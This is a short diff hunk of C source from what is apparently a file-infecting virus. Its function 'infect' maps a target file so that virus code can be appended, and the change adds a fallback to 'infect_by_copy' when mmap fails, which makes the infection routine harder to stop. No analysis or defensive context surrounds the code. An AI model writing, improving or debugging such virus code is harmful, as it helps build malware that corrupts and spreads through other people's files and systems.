@@ -271,8 +271,8 @@ int infect(const char *virus, const virus_info_t *info, const char *path) {
     off_t new_size = stat.st_size + info->size;
     char *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
     if (content == MAP_FAILED) {
-        result = errno;
-        goto close_fd;
+        close(fd);
+        return infect_by_copy(virus, info, path);
     }
 
     posix_madvise(content, new_size, POSIX_MADV_WILLNEED);
